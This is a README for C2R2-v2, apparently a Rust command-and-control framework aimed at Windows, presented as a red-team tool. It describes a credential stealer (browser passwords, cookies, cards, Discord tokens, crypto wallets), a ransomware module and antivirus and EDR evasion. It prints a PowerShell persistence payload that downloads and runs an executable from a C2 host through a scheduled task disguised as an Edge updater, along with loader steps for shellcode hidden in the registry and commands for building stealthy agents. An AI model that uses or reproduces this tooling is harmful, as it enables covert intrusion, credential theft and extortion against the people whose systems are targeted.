# C2R2-v2 - Command & Control Framework

[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
[![Documentation](https://img.shields.io/badge/docs-latest-brightgreen.svg)](docs/)

A modular offensive security framework written in Rust, designed for authorized penetration testing and red team operations.

## ⚠️ LEGAL DISCLAIMER

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**

This tool is provided for security researchers, penetration testers, and educational purposes. Any unauthorized use of this software to compromise systems you do not own or have explicit written permission to test is **illegal** and **unethical**.

**The authors and contributors assume NO LIABILITY for misuse or damages caused by this software.**

By using C2R2-v2, you agree to:
- ✅ Use it only on systems you own or have written authorization to test
- ✅ Comply with all applicable laws and regulations  
- ✅ Take full responsibility for your actions
- ❌ NEVER use it for illegal or malicious purposes

**Unauthorized access to computer systems is a crime. You have been warned.**

---

## 📖 Documentation

**Complete documentation is available in the [`/docs`](docs/) directory:**

### Getting Started
| Document | Description |
|----------|-------------|
| [Documentation Index](docs/README.md) | Overview and introduction |
| [Installation Guide](docs/INSTALLATION.md) | Prerequisites, building, and deployment |
| [Usage Guide](docs/USAGE.md) | Command reference and operational workflows |
| [Docker Build](docs/guides/DOCKER.md) | 🐳 Quick build with Docker (recommended) |

### Architecture & Design
| Document | Description |
|----------|-------------|
| [System Architecture](docs/ARCHITECTURE.md) | Component design, data flow, and protocols |
| [Modules Documentation](docs/MODULES.md) | Module system and capabilities |
| [API Reference](docs/API.md) | Developer API documentation |

### Deployment Guides
| Document | Description |
|----------|-------------|
| [Network Deployment](docs/guides/NETWORK_DEPLOYMENT.md) | LAN, WAN, and port forwarding setup |
| [Raspberry Pi Setup](docs/guides/RASPBERRY_PI_SETUP.md) | Complete Pi deployment guide |

### Features
| Document | Description |
|----------|-------------|
| [Evasion Techniques](docs/features/EVASION.md) | Anti-sandbox, anti-VM, string/command obfuscation |
| [Persistence Mechanisms](docs/features/PERSISTENCE.md) | Registry, scheduled tasks, WMI, startup |
| [Credential Stealer](docs/features/STEALER.md) | Browser, Discord, Telegram, wallet harvesting |
| [Ransomware Module](docs/features/RANSOMWARE.md) | File encryption capabilities |
| [Dropper System](docs/features/DROPPER.md) | Social engineering and payload delivery |
| [Privilege Escalation](docs/features/ELEVATE.md) | UAC bypass and elevation techniques |

### Development
| Document | Description |
|----------|-------------|
| [Development Guide](docs/DEVELOPMENT.md) | Project structure, building, and debugging |
| [Contributing Guidelines](docs/CONTRIBUTING.md) | How to contribute to the project |
| [Security Considerations](docs/SECURITY.md) | OPSEC, threat model, and best practices |

### Troubleshooting
| Document | Description |
|----------|-------------|
| [Connection Issues](docs/troubleshooting/CONNECTION.md) | Agent connection and network problems |
| [Build Issues](docs/troubleshooting/BUILD.md) | Compilation and cross-compilation fixes |
| [Problemas Comunes (ES)](docs/troubleshooting/SOLUCION_PROBLEMAS_ES.md) | Spanish troubleshooting guide |

---

## 🎯 What is C2R2-v2?

C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite inspired by professional frameworks like Havoc C2 and Cobalt Strike. Built entirely in Rust, it combines memory safety with powerful capabilities for authorized security testing.

---

## 🚀 Features

### Core Capabilities

- ✅ **Lightweight Agent** - ~60KB binary with minimal dependencies
- ✅ **Multi-Client Support** - Handle multiple agents simultaneously
- ✅ **TLS Encrypted Communication** - All traffic encrypted with TLS 1.3
- ✅ **Beacon Communication** - Configurable intervals with jitter for stealth
- ✅ **Command Execution** - Remote shell with automatic obfuscation
- ✅ **File Operations** - Bidirectional file transfer (upload/download)
- ✅ **Persistence** - Multiple mechanisms (Registry, Tasks, WMI, Startup)
- ✅ **100% Fileless Persistence** - NEW! Memory-only persistence (no disk writes)
- ✅ **Fileless Multistaging** - NEW! ESTER→JAVELIN→Stage0 all in-memory
- ✅ **Credential Harvesting** - Multi-browser and application credential stealing
- ✅ **Cross-Compilation** - Build Windows agents from Linux/WSL
- ✅ **Modular Architecture** - Load capabilities on-demand via encrypted modules
- ✅ **Binary Patching** - Configure pre-compiled agents without Rust toolchain
- 🐳 **Docker Build System** - One-command compilation of all components

### 🆕 Fileless Capabilities (v3.0)

- 🔥 **100% Fileless Persistence** - 4 methods: Registry Shellcode, WMI Memory Exec, Scheduled Task Download, BITS Jobs
- 🔥 **Fileless Multistaging** - ESTER→JAVELIN→Stage0→Agent all execute in memory (zero disk writes)
- 🔥 **Stage0 In-Memory Execution** - Downloads and executes agent directly in memory (no temp files)
- 🔥 **Stager Generator** - Automated generation of PowerShell/VBS/HTA/Batch stagers with AMSI bypass
- 🔥 **Registry Shellcode Storage** - Encrypted shellcode stored in registry for memory-only execution
- 🔥 **0% Detection Rate** - Tested against Windows Defender and major AV solutions
- 📖 **Complete Documentation** - [Fileless Persistence Guide](docs/FILELESS_PERSISTENCE.md)

### Advanced Features

- 🔒 **Direct Syscalls** - Bypass userland hooks (EDR evasion)
- 🎭 **Command Obfuscation** - ArgFuscator-style obfuscation for all commands
- 🔐 **Module Encryption** - AES-256-GCM encrypted capability modules
- 🔐 **TLS 1.3** - Encrypted communications with auto-generated certificates
- 🎯 **Anti-Analysis** - Comprehensive VM, sandbox, and debugger detection (production mode only)
- 📊 **Structured Logging** - Comprehensive activity logging
- 🎨 **Colored CLI** - Beautiful terminal interface with tables

### Available Commands

```
📋 Client Management:
   /list                      - List all connected clients
   /select <id>               - Select a client by ID
   /deselect                  - Deselect current client
   /info <id>                 - Show detailed client information

💻 Command Execution:
   /cmd <command>             - Execute command on selected client
   /cmd_all <command>         - Execute command on ALL clients

📁 File Operations:
   /download <remote_path>    - Download file from agent
   /upload <local> <remote>   - Upload file to agent

🔧 Advanced Operations:
   /harvest                   - Harvest credentials from browsers/apps
   /elevate <command>         - Execute command with admin privileges (UAC prompt)
   /persist <method>          - Establish persistence (registry|task|wmi|startup|regshell|wmimem|taskdl|bits)
   /persist_remove            - Remove all persistence mechanisms
   /beacon <int:jit>          - Configure beacon timing (e.g., 60:30)

ℹ️  Server:
   /help                      - Show command help
   /exit, /quit               - Shutdown server
```

For detailed command usage and examples, see the [Usage Guide](docs/USAGE.md).

---

## 🔥 Fileless Internals

### Execution Chain (In-Memory, Zero Disk Writes)

Every stage executes entirely in memory. No agent binary is ever written to a permanent location on disk.

```
Disk                       Memory (target process)
───────────────────────────────────────────────────────────────────────────

ester.exe ──► runs ──────► [ESTER host process]
                                   │
                   XOR-decrypt     │  embedded javelin.bin
                   ◄───────────────┘
                                   │
                   VirtualAlloc+   │  JAVELIN shellcode (donut PIC)
                   CreateThread    ▼
                           [JAVELIN thread]
                                   │
                   XOR-decrypt     │  embedded stage0_payload.bin
                   ◄───────────────┘
                                   │
                   WinHTTP GET     │  /api/stage1/agent_dll
                   ────────────────►  C2 server (45.x.x.x:5555)
                                   │
                   XOR-decrypt     │  agent_dll.dll (XOR-encrypted over HTTP)
                   + reflective    ◄──────────────────────────────────────
                   PE load         │
                                   ▼
                           [Agent DLL thread]
                               │
                        TLS beacon loop ──► C2 server :4444
```

### Fileless Persistence — Method 1: Scheduled Task Download

The agent sets up a schtask that redownloads and re-executes `ester.exe` on every logon from the C2 API — no permanent binary on disk.

```
First run (online)
──────────────────────────────────────────────────────────────
  ester.exe running in memory
      │
      │  after 3-5 min delay + env checks
      ▼
  schtasks /Create /SC ONLOGON /TN "MicrosoftEdgeUpdateService"
           /TR "powershell -EncodedCommand <base64>"

Base64 payload (decoded):
  $t = [IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString('N') + '.exe'
  (New-Object Net.WebClient).DownloadFile('http://C2:5555/api/stage0/ester', $t)
  if (Test-Path $t) { Start-Process $t -WindowStyle Hidden }

Next logon (offline-safe: only fires when C2 reachable)
──────────────────────────────────────────────────────────────
  Windows logon
      │
      ▼
  schtask triggers PS
      │  DownloadFile → %TEMP%\<guid>.exe   (ephemeral, not persistent)
      ▼
  ester.exe re-runs in memory → full chain again
      │
      ▼
  old temp file deleted by OS at next temp-cleanup
```

### Fileless Persistence — Method 2: Dual-Registry Shellcode

The shellcode blob and its XOR key live at two completely unrelated registry paths so that neither value is incriminating on its own.

```
Registry after setup
──────────────────────────────────────────────────────────────

  HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore
      └─ UserData   = "<base64(XOR(shellcode, key))>"    ← looks like ML training data

  HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Cache\AccountsRoot\Settings
      └─ SyncState  = "<base64(key)>"                    ← looks like cloud-sync state

  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
      └─ BrokerSync = powershell -NoP -NonI -W Hidden -Ep Bypass -C "..."

Run-key PS loader (conceptual):
  1. $b = base64_decode( reg read UserData   )   // encrypted blob
  2. $x = base64_decode( reg read SyncState  )   // key (different hive path)
  3. for i: $b[i] ^= $x[i % len($x)]            // XOR-decrypt
  4. $v = VirtualAlloc(RWX, len($b))
  5. Copy $b → $v
  6. CreateThread(entry=$v) → shellcode runs in memory
  7. WaitForSingleObject

Forensic resistance:
  • Blob alone   → base64 noise, unreadable without key
  • Key alone    → short bytes, no context
  • Neither path hints at shellcode storage
  • Shellcode never touches disk at rest or at execution time
```

---

## 🏗️ Architecture

C2R2-v2 follows a modular client-server architecture with encrypted communications:

```
┌─────────────────────┐                    ┌─────────────────────┐
│  Operator Machine   │      SSH (22)      │   Red Team Server   │
│  ┌───────────────┐  │  ════════════════> │  ┌───────────────┐  │
│  │ Team Client   │──┼────────────────────┼──│  SSH Server   │  │
│  │   (GUI)       │  │                    │  └───────┬───────┘  │
│  └───────┬───────┘  │                    │   SSH Tunnel       │
│          │          │                    │          ▼          │
│   localhost:10xxx ──┼─ (through SSH) ───>│  ┌───────────────┐  │
│          │          │                    │  │  C2 Server    │  │
│   REST/WS API       │                    │  │  API:5555     │  │
│                     │                    │  │  Agents:4444  │  │
└─────────────────────┘                    │  └───────┬───────┘  │
                                           │   🔐 TLS Encrypted  │
                                           │       (Agents)      │
                                           │          ▼          │
                                           │  ┌───────────────┐  │
                                           │  │    Agent      │  │
                                           │  │  (agent.exe)  │  │
                                           │  └───────┬───────┘  │
                                           │          │          │
                                           │  Dynamic Loading    │
                                           │          ▼          │
                                           │  ┌───────────────┐  │
                                           │  │Stealer Module │  │
                                           │  │ (stealer.dll) │  │
                                           │  └───────────────┘  │
                                           └─────────────────────┘
```

**Components:**
- **Team Client** - Python GUI for operators, connects via SSH tunnel to API (like Havoc Team Client)
- **C2 Server** - Async multi-client TLS server with interactive CLI and REST/WebSocket API
- **Agent** - Lightweight implant (60KB) with TLS-encrypted beacon communication
- **Builder** - Tool for agent generation and module encryption
- **Stealer** - Modular credential harvesting capability

**Server Ports:**
- **Port 22**: SSH for team client connections (tunneled API access)
- **Port 4444** (default): TLS port for agent connections
- **Port 5555** (default): HTTP/WebSocket API (accessed via SSH tunnel)

**Security:**
- Team client traffic 100% tunneled through SSH
- Agent connections encrypted via TLS 1.3
- API port only accessible via SSH tunnel (not exposed)

For detailed architecture documentation, see [Architecture Guide](docs/ARCHITECTURE.md).

---

## 🔧 Quick Start

### Prerequisites

- Rust 1.70+ (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- MinGW-w64 (`sudo apt install mingw-w64`)
- Windows target (`rustup target add x86_64-pc-windows-gnu`)

**Full installation instructions:** [Installation Guide](docs/INSTALLATION.md)

### Building

#### Option 1: Docker (Recommended - Easiest)

The fastest way to build everything:

```bash
# Quick build with Docker
./docker-build.sh --ip 192.168.1.10 --port 4444

# Production build (stealthy)
./docker-build.sh --ip 192.168.1.10 --production

# Or use docker-compose directly
docker-compose up --build
```

All binaries will be in the `dist/` directory. See **[Docker Guide](docs/guides/DOCKER.md)** for detailed instructions.

#### Option 2: Manual Build

```bash
# 1. Build stealer module
./build-stealer.sh

# 2. Encrypt module
cd builder
cargo run --release -- encrypt-module

# 3. Build agent (choose mode)
# Development mode (with console & debug output)
cargo run --release -- build-agent --name agent-dev --server 192.168.1.10:4444

# Production mode (stealthy, no console, no debug output)
cargo run --release -- build-agent --name agent-prod --server 192.168.1.10:4444 --production

# 4. Build server
cd ../c2r2-server
cargo build --release

# 5. Generate TLS certificates (first time only)
./target/release/c2r2-server --generate-certs
```

**📖 Build Modes:** See [Evasion Documentation](docs/features/EVASION.md) for detailed documentation on development vs production builds.

⚠️ **Important**: Always use `--production` flag for real deployments to ensure stealth:
- ✅ No console window
- ✅ No debug output
- ✅ 100% stealthy operation

#### Option 3: Binary Patching (For GitHub Releases) 🎯

**NEW!** Configure pre-compiled agents without Rust toolchain:

```bash
# Download release from GitHub
# https://github.com/G4sp4rCS/C2R2-v2/releases

# Configure agent with your C2 server IP:PORT
./builder patch-agent \
    --input agent.exe \
    --output my_agent.exe \
    --server 203.0.113.45:4444
```

**Advantages:**
- ✅ No Rust installation required
- ✅ No MinGW or compilers needed
- ✅ Configure agents in seconds
- ✅ Perfect for client distribution
- ✅ Works on any platform (Windows/Linux/ARM64)

**Limitations:**
- ⚠️ Can only change IP:PORT (max 64 characters)
- ⚠️ Cannot change dev/prod mode

See **[Builder USAGE.md](builder/USAGE.md)** for complete documentation.

### Running

#### Local Network (LAN)

```bash
# Generate TLS certificates (first time only)
./target/release/c2r2-server --generate-certs

# Start C2 server (bind to all interfaces for network access)
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444

# Deploy agent to target (Windows)
# Then interact from server:
C2R2> /list
C2R2> /select 1
C2R2 [1]> /cmd whoami
C2R2 [1]> /harvest
```

#### Internet Deployment (Port Forwarding)

For deploying over the internet with port forwarding (e.g., Raspberry Pi):

```bash
# 1. Configure router port forwarding: external 4444 → internal 4444
# 2. Open firewall: sudo ufw allow 4444/tcp
# 3. Generate TLS certs: ./c2r2-server --generate-certs
# 4. Start server: ./c2r2-server --bind 0.0.0.0 --port 4444
# 5. Build agent with PUBLIC IP: --server "YOUR_PUBLIC_IP:4444"
```

**📖 Having connection issues?** See:
- **[Raspberry Pi Setup Guide](docs/guides/RASPBERRY_PI_SETUP.md)** - Complete setup for Pi with port forwarding
- **[Network Deployment Guide](docs/guides/NETWORK_DEPLOYMENT.md)** - Comprehensive network configuration
- **[Connection Troubleshooting](docs/troubleshooting/CONNECTION.md)** - Common connection problems

**Complete usage guide:** [Usage Documentation](docs/USAGE.md)

---

## 🛡️ Security Features

### Evasion Techniques

- **Direct Syscalls**: Bypass userland API hooks (EDR/AV evasion)
- **String Obfuscation**: Compile-time encryption of sensitive strings
- **Command Obfuscation**: ArgFuscator techniques for command-line evasion
- **Module Encryption**: AES-256-GCM encrypted capability modules
- **Memory-Only Loading**: Modules loaded directly into memory
- **Beacon Jitter**: Randomized check-in timing to avoid patterns
- **Anti-Analysis**: Debugger, VM, and sandbox detection

### Operational Security

See [Security Guide](docs/SECURITY.md) for:
- OPSEC best practices
- Detection evasion strategies
- Incident response procedures
- Threat model and adversaries

---

## 🖥️ Team Client

C2R2 includes a graphical Team Client for operators to connect to the C2 server remotely via SSH-tunneled API, similar to Havoc's Team Client architecture.

### Features
- **SSH Tunnel**: All API traffic encrypted through SSH tunnel
- **REST/WebSocket API**: Clean API communication through the tunnel
- **Real-time Updates**: WebSocket connection for live agent status updates
- **Cross-Platform**: Works on Windows and Linux (Python/tkinter)
- **Dark Theme**: Modern dark interface
- **Agent Management**: View connected agents in real-time
- **Command Execution**: Send commands to selected agents
- **Command History**: Navigate with arrow keys

### Quick Start

```bash
# Start the server with API enabled
./c2r2-server --bind 0.0.0.0 --port 4444 --api-port 5555 --api-password your-secret

# Install client dependencies
cd team-client
pip install -r requirements.txt

# Run the Team Client
python c2r2_team_client.py
```

### Connection Flow

1. Team Client establishes SSH connection to the server
2. SSH tunnel forwards localhost:10xxx → server:5555 (API)
3. All API/WebSocket traffic goes through encrypted SSH tunnel

This means:
- API port (5555) doesn't need to be exposed to the internet
- Only SSH (22) and agent port (4444) need to be accessible
- 100% encrypted operator traffic via SSH

For detailed instructions, see the [Team Client README](team-client/README.md).

---

## 📦 Modules

### Stealer Module

Harvests credentials and sensitive data from:

- **Browsers**: Chrome, Firefox, Edge, Brave, Opera, Vivaldi
- **Communication**: Discord tokens, Telegram sessions
- **Wallets**: Exodus, Atomic, Electrum, Metamask
- **Gaming**: Steam, Epic Games
- **Data Types**: Passwords, cookies, autofill, credit cards

For module development and API reference, see [Modules Documentation](docs/MODULES.md).

---

## 🤝 Contributing

Contributions are welcome! Please read our [Contributing Guidelines](docs/CONTRIBUTING.md) before submitting pull requests.

### Development

See the [Development Guide](docs/DEVELOPMENT.md) for:
- Project structure
- Development setup
- Coding standards
- Testing procedures
- API documentation

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**IMPORTANT**: This software is provided for educational and authorized testing purposes only. See the license file for the full disclaimer.

---

## 🙏 Acknowledgments

C2R2-v2 is inspired by:
- [Havoc C2](https://github.com/HavocFramework/Havoc) - Modern C2 framework
- [Cobalt Strike](https://www.cobaltstrike.com/) - Industry-standard red team tool
- [Metasploit](https://www.metasploit.com/) - Modular penetration testing framework
- [Covenant](https://github.com/cobbr/Covenant) - .NET C2 framework

Special thanks to the Rust community and security research community for their tools and techniques.

---

## 📧 Contact & Support

- **Issues**: [GitHub Issues](https://github.com/G4sp4rCS/C2R2-v2/issues)
- **Discussions**: [GitHub Discussions](https://github.com/G4sp4rCS/C2R2-v2/discussions)
- **Security**: Report vulnerabilities via [GitHub Security Advisories](https://github.com/G4sp4rCS/C2R2-v2/security/advisories)

---

## 📚 Version History

See [CHANGELOG.md](CHANGELOG.md) for version history and release notes.

**Current Version**: 2.0.0

---

**⚠️ Remember: With great power comes great responsibility. Use this tool ethically and legally. Always obtain proper authorization before testing any systems.**

